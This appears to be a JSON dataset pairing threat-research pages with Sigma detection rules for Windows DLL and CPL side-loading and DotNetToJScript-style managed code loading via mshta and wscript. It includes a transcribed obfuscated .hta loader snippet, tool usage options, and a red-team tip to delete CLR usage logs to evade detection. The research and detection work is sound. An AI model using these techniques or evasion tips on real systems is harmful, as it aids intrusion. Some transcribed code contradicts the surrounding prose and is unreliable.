    "url": "https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/",
    "markdown": "# 1 little known secret of fondue.exe\n\nPosted on 2024-01-06\n\nSame as in the previous case, we can copy the main executable *fondue.exe* to a different folder f.ex. *c:\\test* and start it from there, loading the c:\\test\\ *appwiz.cpl* we control in the process.\n\n```image\nAlt: fondue\nDescription: The image displays a detailed log of operations performed by the process 'fondue.exe' related to the file 'appwiz.cpl' located in the 'C:\\test' directory. It includes timestamps, process IDs (PIDs), and the results of various file operations such as 'CreateFile', 'CloseFile', and 'QueryBasicInformationFile'. The log shows the success of most operations, with a final entry indicating that the file was locked.\nTranscription: |\n  | Time of Day        | Process    | PID  | Operation                    | Path               | Result                  |\n  | ------------------ | ---------- | ---- | ---------------------------- | ------------------ | ----------------------- |\n  | 5:23:07.2204452 PM | Fondue.exe | 4568 | CreateFile                   | C:\\test\\appwiz.cpl | SUCCESS                 |\n  | 5:23:07.2204770 PM | Fondue.exe | 4568 | QueryBasicInformationFile    | C:\\test\\appwiz.cpl | SUCCESS                 |\n  | 5:23:07.2204890 PM | Fondue.exe | 4568 | CloseFile                    | C:\\test\\appwiz.cpl | SUCCESS                 |\n  | 5:23:07.2207374 PM | Fondue.exe | 4568 | CreateFile                   | C:\\test\\appwiz.cpl | SUCCESS                 |\n  | 5:23:07.2907950 PM | Fondue.exe | 4568 | CreateFileMapping            | C:\\test\\appwiz.cpl | FILE LOCKED WITH ACCESS |\n  | 5:23:07.2208515 PM | Fondue.exe | 4568 | QueryStandardInformationFile | C:\\test\\appwiz.cpl | SUCCESS                 |\n```\n\nThis entry was posted in Living off the land, LOLBins by adam. Bookmark the permalink.",
    "sigma_rule": {
      "title": "System Control Panel Item Loaded From Uncommon Location",
      "id": "2b140a5c-dc02-4bb8-b6b1-8bdb45714cde",
      "status": "test",
      "description": "Detects image load events of system control panel items (.cpl) from uncommon or non-system locations which might be the result of sideloading.",
      "references": [
        "https://www.hexacorn.com/blog/2024/01/06/1-little-known-secret-of-fondue-exe/",
        "https://www.hexacorn.com/blog/2024/01/01/1-little-known-secret-of-hdwwiz-exe/"
      ],
      "author": "Anish Bogati",
      "date": "2024-01-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\hdwwiz.cpl",
            "\\appwiz.cpl"
          ]
        },
        "filter_main_legit_location": {
          "ImageLoaded|contains": [
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_cpl_from_non_system_location.yml",
    "id": "29"
  },
  {
    "url": "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html",
    "markdown": "# libvlc.dll\n\nPart of the Hijack Libs project.\n\n## Description\n\n### Type\n\n**DLL Sideloading** (1 EXE)\nBy copying (and optionally renaming) a vulnerable application to a user-writeable folder, alongside a malicious `libvlc.dll`, arbitrary code can be executed through the legitimate application.\n*See also MITRE ATT&CK® technique T1574.002: Hijack Execution Flow: DLL Side-Loading.*\n\n### Vendor\n\nVLC\n\n### Resources\n\n- news.sophos.com\n- www.microsoft.com\n\n### Last updated\n\nover 1 year ago (2022-11-18)\n\n## Expected Locations\n\nThe file `libvlc.dll` is normally found in the following path:\n\n- `%PROGRAMFILES%\\VideoLAN\\VLC`\n\n## Vulnerable Executables\n\nThe following executable attempts to load `libvlc.dll`:\n\n- `%PROGRAMFILES%\\VideoLAN\\VLC\\vlc.exe`\n  **File hash available**: VirusTotal entry\n\n## Detection\n\nBelow a sample Sigma rule that will find processes that loaded `libvlc.dll` located in a folder that is not one of the expected locations (see above).\n\n### Image Load Detection\n```\ntitle: Possible DLL Hijacking of libvlc.dll\nid: 1010921b-1035-48a3-1344-5b9ff8330336\nstatus: experimental\ndescription: Detects possible DLL hijacking of libvlc.dll by looking for suspicious image loads, loading this DLL from unexpected locations.\nreferences:\n  - https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html\nauthor: \"Wietze Beukema\"\ndate: 2022-11-18\ntags:\n  - attack.defense_evasion\n  - attack.T1574.002\nlogsource:\n  product: windows\n  category: image_load\ndetection:\n  selection:\n    ImageLoaded: '*\\libvlc.dll'\n  filter:\n    ImageLoaded:\n      - 'c:\\program files\\VideoLAN\\VLC\\*'\n      - 'c:\\program files (x86)\\VideoLAN\\VLC\\*'\n  condition: selection and not filter\nfalsepositives:\n  - False positives are likely. This rule is more suitable for hunting than for generating detections.\n```\n\n### File Event Detection\n```\ntitle: Possible preparation for libvlc.dll DLL Hijacking\nid: 1010922b-1035-48a3-1344-5b9ff8330336\nstatus: experimental\ndescription: Detects possible DLL hijacking of libvlc.dll by looking for suspicious file writes of this DLL, to unexpected locations.\nreferences:\n  - https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html\nauthor: \"Wietze Beukema\"\ndate: 2022-11-18\ntags:\n  - attack.defense_evasion\n  - attack.T1574.002\nlogsource:\n  product: windows\n  category: file_event\ndetection:\n  selection:\n    TargetFileName: '*\\libvlc.dll'\n  filter:\n    TargetFileName:\n      - 'c:\\program files\\VideoLAN\\VLC\\*'\n      - 'c:\\program files (x86)\\VideoLAN\\VLC\\*'\n  condition: selection and not filter\nfalsepositives:\n  - False positives are likely. This rule is more suitable for hunting than for generating detections.\n```\n\nNote that this rule is also included in the Sigma feed that comprises all DLL Hijacking entries part of this project.\n\n## FAQs\n\n**Why should I care about this?**\nDLL Hijacking enables the execution of malicious code through a signed and/or trusted executable. Defensive measures such as AV and EDR solutions may not pick up on this activity out of the box, and allow-list applications such as AppLocker may not block the execution of the untrusted code. There are numerous examples of threat actors that have been observed to leverage DLL Hijacking to achieve their objectives. As such, this project wants to encourage you to monitor for unusual activity involving `libvlc.dll`.\n\n**How do I abuse this vulnerability?**\nAs a red teamer, you will have to compile your own version of `libvlc.dll`. There are various guides on how this can be achieved.\n\n**How could the vendor have prevented this vulnerability?**\nMost DLL Hijacking vulnerabilities are introduced by the 'lazy' loading of DLL files, which relies on Windows' default DLL search order. Explicitly specifying where a required DLL is located is easy and often already helps a lot. This doesn't have to hurt portability if Windows API calls are used to obtain paths, e.g. GetSystemDirectory to get the path of the System32 folder. Even better is to check the signature of required DLLs prior to loading them; most platforms, frameworks and/or runtimes offer means to verify DLL signatures with minimal performance impact.\n\n**This DLL Hijack doesn't seem to work (anymore), why is it still included?**\nLuckily, vendors regularly patch vulnerable applications in order to prevent DLL Hijacking from taking place. Nevertheless, older versions will remain vulnerable; for that reason, the entry won't be deleted from this project. To help others, you may want to open a pull request updating the 'precondition' tag on this entry to make the community aware of the reduced scope.",
    "sigma_rule": {
      "title": "Potential Libvlc.DLL Sideloading",
      "id": "bf9808c4-d24f-44a2-8398-b65227d406b6",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"libvlc.dll\", a DLL that is legitimately used by \"VLC.exe\"",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html",
        "https://hijacklibs.net/entries/3rd_party/vlc/libvlc.html"
      ],
      "author": "X__Junior",
      "date": "2023-04-17",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\libvlc.dll"
        },
        "filter_main_vlc": {
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\VideoLAN\\VLC\\",
            "C:\\Program Files\\VideoLAN\\VLC\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "False positives are expected if VLC is installed in non-default locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_libvlc.yml",
    "id": "33"
  },
  {
    "url": "https://github.com/tyranid/DotNetToJScript",
    "markdown": "# DotNetToJScript\n\nA tool to create a JScript file which loads a .NET v2 assembly from memory.\n\n## License\n\nGPL-3.0 license\n\n## Usage Notes\n\nThis only works from full trust JScript (obviously), so should work in scriptlets etc. By default, it will only work if v2/v3/v3.5 is installed. However, if you specify the '-ver auto' switch when building the output, it will also work on v4+ only, however that will introduce a dependency on WScript.Shell which you might not want.\n\nTo use this, you'll need to create an assembly which targets .NET 2 (though in most cases you can also use 3.5 as you don't tend to see .NET 2 installed in isolation). In the assembly, implement a class called `TestClass` which does something you want to do in the public, parameterless constructor.\n\n```\npublic class TestClass\n{\n    public TestClass()\n    {\n        /* Start notepad */\n        Process.Start(\"notepad.exe\");\n    }\n}\n```\n\nEnsure it's public. Then pass to this tool the path to the .NET assembly. If you annotate the class with the `ComVisible` attribute, you can even interact with the object after it's created. e.g.\n\n```\n[ComVisible(true)]\npublic class TestClass\n{\n    public void DoSomething(string arg) { }\n}\n```\n\nYou can change the name of the entry class by using the `-c` switch and adding the name. You can also get the tool to add additional code to interact with the object by specifying the `-s` parameter with the path to a text file containing the additional JScript. The created object is named 'o', so for example if you wanted to call the `DoSomething` method load a file containing:\n\n```\no.DoSomething(\"SomeArg\");\n```\n\nThe default mode is to output a JScript file which can be executed in Windows Scripting Host. However, if you want a scriptlet pass either `-m` (for a scriptlet which can be used from a scriptlet moniker) or `-u` (for a scriptlet which can be used from regsvr32). You can also specify the `-l vba` switch to output a VBA file which should work in Office Macros or `-l vbscript` for VBScript.\n\nFinally, by default the tool will output to stdout, you can output direct to a file using the `-o` switch.",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml",
    "id": "50"
  },
  {
    "url": "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
    "markdown": "# Interesting DFIR traces of .NET CLR Usage Logs\n\n**Date**: 16 July 2019\n\nAs most of you already know .NET has become an increasingly important component in the offensive world, with attackers making increasing direct use of it as well as indirect use of it via existing windows scripting utilities. One good example of the indirect approach is DotNetToJScript, which allow to deliver managed code via a simple JavaScript.\n\nWe decided to take a closer look to this category of malicious code delivery, which lead us to this great Offensive tool by MDSec \"SharpShooter\" (at it's heart make use of DotNetJScript).\n\nSharpShooter allow to generate multiple payload formats (hta, js, jse, vba, vbe, vbs, wsf), if your are interested about how it works or how to use it please refer to this MDSec post.\n\nFor testing purposes we will be using the .hta payload as an example, below an example of the content of our test payload (will spawn notepad.exe):\n\n```image\nAlt: Payload Example 1\nDescription: The image displays a snippet of JavaScript code that appears to be part of a malicious payload. It includes functions for decrypting and executing code, utilizing RC4 encryption with a specified key. The code is likely intended for obfuscation to deliver a payload in a stealthy manner. The content of the script suggests it's designed to manipulate or execute additional code, possibly related to .NET CLR usage logs, as discussed in the accompanying CTI context.\nTranscription: |\n  html\n  <HTML><HEAD></HEAD><BODY>\n  <script language=\"javascript\">\n  var f=function(key,str){\n      var res=[],i,j=0;\n      for(var i=0;i<str.length;++i){res[i]=str.charCodeAt(i)^key[j];j=(j+1)%key.length;}\n      return res;\n  }\n  \n  var decodeBase64=function(){var e=[],b=0,c=0,len=0;var h=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";for(i=0;i<str.length;i+=3){e.push((h.indexOf(str.charAt(i))<<18)|(h.indexOf(str.charAt(i+1))<<12)|(h.indexOf(str.charAt(i+2))<<6)|(h.indexOf(str.charAt(i+3)))));for(j=0;j<3;j++){if(e[b]>>>(8*(2-j))&255){res.push(String.fromCharCode(e[b]>>>(8*(2-j))&255));len++;}}}\n      while(len--){if((res[len]!==null)&&(res[len]!==undefined)&&(res[len]!==\"\")){}}\n      return res;\n  }\n  \n  var encodedCode=\"...\"; // Base64 encoded string here\n```\n\nAs you can see above, it uses RC4 with the key \"'wxzomjyhto'\" to decrypt a base64 decoded blob, and then execute the resulting VBScript, below the decoded script:\n\n```image\nAlt: Payload Example 2\nDescription: The image displays a snippet of HTML and JavaScript code. The code includes a script tag that appears to involve decoding a base64-encoded string, which is likely part of a payload designed for executing malicious actions. The content suggests that it is related to the execution of .NET CLR usage logs or similar techniques for delivering managed code. This image is part of a technical discussion on malicious code delivery methods.\nTranscription: |\n  html\n  <script language=\"javascript\">\n  var decoded = atob(\"...\"); // Base64 encoded string\n  eval(decoded);\n  </script>\n  <html>\n  <body>\n  <script language=\"vbscript\">\n      ' Execute plain\n      xml.el.clone\n  </script>\n  </body>\n  </html>\n```\n\nAs you can see above, it uses the **Deserialize_2** method of the **System.Runtime.Serialization.Formatters.Binary.BinaryFormatter** COM Object which is \"high level\" how the \"DotNetToJScript\" technique works to load managed code via object Deserialization.\n\nDecoding the base64 encoded blob will lead us to a .NET executable, which will be used to load and execute our msfvenom base64 encoded shellcode (see \"o.Go\" method call), the shellcode will simply launch notepad.exe.\n\n```image\nAlt: Go Method\nDescription: The image displays a code snippet from a programming environment, focusing on a section of code related to the 'SharpShooter' tool. It shows a method named 'ShareProcess' and includes various programming elements such as class definitions, method calls, and data types. The context suggests that this code is part of an offensive security tool used for generating payloads, specifically highlighting managed code execution via .NET.\nTranscription: |\n  public void Sharing()\n  {\n      try\n      {\n          // Code for sharing\n      }\n      catch (Exception ex)\n      {\n          // Handle exception\n      }\n  }\n  \n  public void ShareResource(byte[] resource)\n  {\n      // Code to share resource\n  }\n  \n  public void AllocateMemory(int size)\n  {\n      // Allocate memory\n      byte[] buffer = new byte[size];\n      // Further processing\n  }\n  \n  public class AllocatedMemory\n  {\n      public int Size { get; set; }\n      public byte[] Data { get; set; }\n  }\n```\n\nNow let's switch to what happens when we open this .hta file, to do this we will be using Sysmon with the following configuration:\n\n**N.B:** the used sysmon config is designed to capture the relevant events we need and \"more\".\n\n```image\nAlt: Sysmon Configuration 1\nDescription: The image shows the Event Properties for a Sysmon event, specifically detailing a process creation event for 'mshta.exe'. It includes relevant fields such as the UTC time of the event, process ID, command line arguments used when launching the .hta file, and the parent process information. This detailed output is useful for digital forensics and incident response, allowing analysts to track malicious activity related to .NET CLR usage.\n```\n\n```image\nAlt: Sysmon Configuration 2\nDescription: The image shows the properties of an event captured by Sysmon, detailing a process creation event. It includes various fields such as Rule Name, Process GUID, File Name, Product, Company, Command Line, and Hashes. This information is crucial for tracking the execution of processes and analyzing potential malicious activity related to .NET CLR usage.\nTranscription: |\n  {\n    \"Event\": {\n      \"Process Create\": {\n        \"RuleName\": \"Process Create\",\n        \"UtcTime\": \"2019-07-15 21:22:51.278\",\n        \"ProcessId\": \"4403842c-eaab-52dc-0000-00109fe26962\",\n        \"Image\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"FileVersion\": \"10.0.10586.0 (WinBuild.160101.0800)\",\n        \"Description\": \"Notepad\",\n        \"Product\": \"Microsoft® Windows® Operating System\",\n        \"Company\": \"Microsoft Corporation\",\n        \"CommandLine\": \"notepad.exe\",\n        \"LogonGuid\": \"{4403842c-eaab-52dc-0000-0020039b1000}\",\n        \"LogonId\": \"0x10903\",\n        \"TerminalSessionId\": 1,\n        \"IntegrityLevel\": \"Medium\",\n        \"Hashes\": {\n          \"SHA1\": \"CA798569E531867108C744E102F84A202ABBAA6\",\n          \"MD5\": \"FA97F78B1FA59872A2ECDA2D9DF20EF\",\n          \"SHA256\": \"A1E7FBD03C580753483A187B303A92301667F1B8B9EBC8527311749023\",\n          \"IMPHASH\": \"1D40B0E7E65973B2EC7B43DF3EE5\"\n        },\n        \"ParentProcessId\": 17500,\n        \"ParentProcessGuid\": \"{4403842c-eaab-52dc-0000-00103336962}\",\n        \"ParentImage\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe\",\n        \"ParentCommandLine\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe \\\"C:\\\\Users\\\\sboussaeden\\\\Downloads\\\\mcafee (1).hta\\\" {1E460BDF-F1C3-4B2E-88BF-4E770A288AF5}\"\n      }\n    }\n  }\n```\n\nAs you can see above, from process execution events, we don't see any clear traces of .NET code execution. enabling CLR common modules loading logging via sysmon is not an option since it's very noisy and lot of processes loads those DLLs. Luckily for us while observing mshta.exe execution via ProcMon, we saw an interesting file being created under Microsoft .NET CLR usage logs [%localappdata%\\Microsoft\\CLR_v<version_number>\\UsageLogs\\ProcessName.exe.Log]:\n\n```image\nAlt: Usage Logs\nDescription: The image displays the Event Properties from Sysmon, specifically Event ID 11, which indicates a file creation event. It highlights the creation of a log file under the Microsoft .NET CLR Usage Logs directory. Key details include the rule name, process ID, image path of mshta.exe, and the location of the created log file. The log captures relevant timestamps and system information, emphasizing the detection of potentially suspicious managed code execution.\nTranscription: |\n  {\n    \"Event\": {\n      \"RuleName\": \"Execution - Susp ManagedCode Host Process\",\n      \"UtcTime\": \"2019-07-15 21:40:40.538\",\n      \"ProcessGuid\": \"{4403842c-f2d7-5d2c-0000-00101910c162}\",\n      \"ProcessId\": 17108,\n      \"Image\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe\",\n      \"TargetFilename\": \"C:\\\\Users\\\\<UserName>\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v2.0_32\\\\UsageLogs\\\\mshta.exe.log\",\n      \"CreationUtcTime\": \"2019-07-15 21:40:40.538\"\n    },\n    \"Log\": {\n      \"Name\": \"Microsoft-Windows-Sysmon/Operational\",\n      \"Source\": \"Sysmon\",\n      \"Logged\": \"7/15/2019 11:40:40 PM\",\n      \"EventId\": 11,\n      \"TaskCategory\": \"File created (rule: FileCreate)\",\n      \"Level\": \"Information\",\n      \"Keywords\": \"\"\n    }\n  }\n```\n\nThe file creation date indicate the first time the process was executed, for any further executions of the same process, the same file is updated and no file creation event is recorded. Content of the file display the list of linked assembly modules and their versions:\n\n```image\nAlt: Capture\nDescription: The image shows a text excerpt from a Notepad document containing a log or data related to .NET assemblies. It lists paths to various native images and their corresponding assembly names, such as 'System.Xml.ni.dll' and 'System.Configuration.ni.dll'. The context suggests that this log is part of the detailed information gathered from the CLR Load Logs, related to the execution of .NET code, possibly within a malware analysis or threat investigation framework.\nTranscription: |\n  {\n    \"fusion\": \"GAC\",\n    \"0\": [\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System\\\\b8de8183f9e3cddfe1c8d8b142653\\\\System.ni.dll\",\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System.Xml\\\\fc7b19f183dd99d27cfe7adbba9bdd\\\\System.Xml.ni.dll\",\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System.Configuration\\\\9060561deff15046e364b70484c24115\\\\System.Configuration.ni.dll\"\n    ]\n  }\n```\n\nFirst question that comes to our mind after observing this file system precious artifact, is what are the windows native system processes that normally loads .NET code, to find out we've used 3 months of EDR process and file creation telemetry covering more 700 Windows 10 endpoints and we filtered for any process starting from \"c:\\windows\\s*\" which covers wscript.exe, cscript.exe and other processes:\n\n```image\nAlt: Capture\nDescription: The image displays a list of executable file paths from a Windows operating system. Each entry is a file path that leads to system processes and applications typically found in the 'C:\\Windows\\' directory. This list appears to be part of a diagnostic or monitoring report, possibly related to the execution or behavior of .NET applications and their logging. It showcases various system utilities and scripts used in the analysis of .NET CLR usage, relevant to Cyber Threat Intelligence.\nTranscription: |\n  C:\\Windows\\System32\\AppV\\StreamingUX.exe\n  C:\\Windows\\System32\\DriverStore\\FileRepository\\prosets\\wcomponent.inf_amd64_e9a24c476c5252e\\INFAppRunner.exe\n  C:\\Windows\\System32\\iedsl.exe\n  C:\\Windows\\System32\\ipresul.exe\n  C:\\Windows\\System32\\inetsrv\\InetMgr.exe\n  C:\\Windows\\System32\\mmc.exe\n  C:\\Windows\\System32\\rundll32.exe\n  C:\\Windows\\System32\\diagnhost.exe\n  C:\\Windows\\System32\\tszync.exe\n  C:\\Windows\\System32\\vmconnect.exe\n  C:\\Windows\\System32\\wbem\\WmiPrivSE.exe\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\n  C:\\Windows\\SysWOW64\\msiexec.exe\n  C:\\Windows\\SysWOW64\\rundll32.exe\n  C:\\Windows\\SysWOW64\\diagnhost.exe\n  C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nAs you can see above, the windows system processes that loads managed code are quite limited and can be baselined, for instance a straightforward detection is to alert for the following:\n\n```image\nAlt: Capture\nDescription: The image displays a section of a log file or code snippet related to monitoring .NET CLR usage logs. It includes XML-like tags indicating conditions for execution related to suspicious managed code host processes, such as 'cscript.exe.log', 'wscript.exe.log', 'mshta.log', and 'svchost.exe.log'. This suggests a method for detecting potential malicious activity by filtering for specific file creation or execution logs.\nTranscription: |\n  <RuleGroup>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\cscript.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\wscript.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\mshta.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\wmic.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\regsvr32.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\svchost.log</TargetFileName>\n      </Rule>\n  </RuleGroup>\n```\n\nWhile googling for extra information about .NET UsageLogs, we come across this interesting article explaining how to use CLR Load logging (different than UsageLogs) for debugging purposes and that can be enabled via a simple registry change and specifying where a path where to store those logs, doing so resulting in the following interesting details after the .hta execution:\n\n```image\nAlt: Capture\nDescription: The image displays a file directory structure on a Windows operating system, showing log files related to .NET CLR Load activities. The files are named according to the process that generated them, including 'mshta.exe.CLRLoad05.log', 'ngen.exe.CLRLoad01.log', and others, with details such as their modification date, type, size, and creation date visible. This directory is likely used for monitoring and analyzing .NET usage, particularly in the context of cybersecurity and digital forensics.\n```\n\nFor every execution a log file is created, below an example of SharpShooter .hta payload:\n\n```image\nAlt: Capture\nDescription: The image displays a portion of a log file output from a Windows command line interface. It shows the CLR loading log for the execution of 'mshta.exe' with specific details about function calls and the associated CLSID. Key information includes the CLSID `{50369004-D9BA-3A75-BE7A-1D0EF01789D3}`, the log start time, and input values for a method call, indicating the inner workings of .NET code execution and serialization related to the previous discussions about .NET CLR Usage Logs.\nTranscription: |\n  13504, 35124.109, CLR Loading log for C:\\Windows\\SysWOW64\\mshta.exe\n  13504, 35124.109, Log started at 11:40:39 PM on 7/15/2019\n  13504, 35124.109, FunctionCall: DllGetClassObject. Clsid: {50369004-D9BA-3A75-BE7A-1D0EF01789D3}, Id: {50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n  13504, 35124.109, Input values for ComputeVersionString follow this line\n  13504, 35124.109, IsLegacyBind is: 1\n  13504, 35124.109, IsCapped is 1\n  \n  [WINDOWS][system32]reg query hkey_classes_root\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n      (Default)    REG_SZ    System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\Implemented categories\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\InprocServer32\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\ProgID\n```\n\nAlthough the CLR Load Logs provide more detailed information including invoked .NET COM objects, FunctionCall and Methods's names it's quite verbose and you can't exclude noisy processes.\n\n**TakeAway:**\n\nUsing your EDR or Sysmon, hunt for File Creation with file path and name matching the following logic:\n\n```\n*\\\\UsageLogs\\\\cscript.exe.log|(wscript.exe.log)|mshta.log|wmic.log|regsvr32.exe.log|svchost.log\n```\n\nThe advantage of this detection method is that you can hunt for it using just powershell or alike to scan filesystem for any matching file that related to a potential previous infections.\n\nFor RedTeamers, go for the vba payload as winword.exe and excel.exe are legit managed code host processes. and make sure you delete the corresponding .NET usage .log file if you plan to use hta, vbscript or jscript payloads.\n\n**Bonus:**\nYou can download example of evtx logs for SharpShooter sysmon traces here (https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Execution/sysmon_mshta_sharpshooter_stageless_meterpreter.evtx).",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml",
    "id": "52"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true",
    "markdown": "# Hunting for Unsigned DLLs to Find APTs\n\n## Executive Summary\n\nMalware authors regularly evolve their techniques to evade detection and execute more sophisticated attacks. We’ve commonly observed one method over the past few years: unsigned DLL loading.\n\nAssuming that this method might be used by advanced persistent threats (APTs), we hunted for it. The hunt revealed sophisticated payloads and APT groups in the wild, including the Chinese cyberespionage group Stately Taurus (formerly known as PKPLUG, aka Mustang Panda) and the North Korean Selective Pisces (aka Lazarus Group).\n\nBelow, we show how hunting for the loading of unsigned DLLs can help you identify attacks and threat actors in your environment.\n\nPalo Alto Networks customers receive protections and detections against malicious DLL loading through the Cortex XDR agent.\n\n| Threat Actor Groups Discussed |                                                                      |\n| ----------------------------- | -------------------------------------------------------------------- |\n| **Unit 42 tracks group as…**  | **Group also known as…**                                             |\n| Stately Taurus                | Mustang Panda, PKPLUG, BRONZE PRESIDENT, HoneyMyte, Red Lich, Baijiu |\n| Selective Pisces              | Lazarus Group, ZINC, APT - C - 26                                    |\n\n## Malicious DLLs: A Common Method Attackers Use for Executing Malicious Payloads on Infected Systems\n\nBased on our observations over years of proactive threat-hunting experience, we hypothesize that one of the main methods for executing malicious payloads on infected systems is loading a malicious DLL. As both individual hackers and APT groups use this method, we decided to conduct research based on this hypothesis.\n\nMost of the malicious DLLs we observe in the wild share three common characteristics:\n\n- The DLLs are mostly written to unprivileged paths.\n- The DLLs are unsigned.\n- To evade detection, the DLLs are loaded by a signed process, whether a utility dedicated to loading DLLs (such as `rundll32.exe`) or an executable that loads DLLs as part of its activity.\n\nWith that in mind, we found that the most common techniques that are being used by threat actors in the wild are the following:\n\n1. DLL loading by `rundll32.exe` / `regsvr32.exe` – While those processes are signed and known 